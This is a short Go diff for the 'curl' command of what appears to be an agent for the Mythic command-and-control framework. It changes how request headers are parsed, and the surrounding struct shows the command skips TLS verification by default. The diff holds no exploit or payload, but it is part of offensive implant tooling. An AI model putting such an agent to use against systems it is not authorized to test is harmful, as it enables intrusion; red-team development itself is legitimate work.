@@ -21,14 +21,35 @@ func (c *CurlCommand) Description() string {
 }
 
 type curlArgs struct {
-	URL      string            `json:"url"`
-	Method   string            `json:"method"`   // GET, POST, PUT, DELETE, HEAD, OPTIONS, PATCH
-	Headers  map[string]string `json:"headers"`  // custom headers
-	Body     string            `json:"body"`     // request body for POST/PUT/PATCH
-	Insecure bool              `json:"insecure"` // skip TLS verification (default: true)
-	Timeout  int               `json:"timeout"`  // timeout in seconds (default: 30)
-	MaxSize  int               `json:"max_size"` // max response body size in bytes (default: 1MB)
-	Output   string            `json:"output"`   // "full" (headers+body), "body" (body only), "headers" (headers only)
+	URL      string          `json:"url"`
+	Method   string          `json:"method"`   // GET, POST, PUT, DELETE, HEAD, OPTIONS, PATCH
+	Headers  json.RawMessage `json:"headers"`  // custom headers — JSON string or map
+	Body     string          `json:"body"`     // request body for POST/PUT/PATCH
+	Insecure bool            `json:"insecure"` // skip TLS verification (default: true)
+	Timeout  int             `json:"timeout"`  // timeout in seconds (default: 30)
+	MaxSize  int             `json:"max_size"` // max response body size in bytes (default: 1MB)
+	Output   string          `json:"output"`   // "full" (headers+body), "body" (body only), "headers" (headers only)
+}
+
+// parseHeaders handles headers sent as either a JSON object or a JSON string containing a JSON object.
+func parseHeaders(raw json.RawMessage) map[string]string {
+	if len(raw) == 0 {
+		return nil
+	}
+	// Try direct map first
+	var m map[string]string
+	if err := json.Unmarshal(raw, &m); err == nil {
+		return m
+	}
+	// Try as JSON string (Mythic sends string params this way)
+	var s string
+	if err := json.Unmarshal(raw, &s); err == nil && s != "" {
+		var m2 map[string]string
+		if err := json.Unmarshal([]byte(s), &m2); err == nil {
+			return m2
+		}
+	}
+	return nil
 }
 
 const (
@@ -110,7 +131,8 @@ func (c *CurlCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 
 	// Set custom headers
-	for key, val := range args.Headers {
+	headers := parseHeaders(args.Headers)
+	for key, val := range headers {
 		req.Header.Set(key, val)
 	}
 
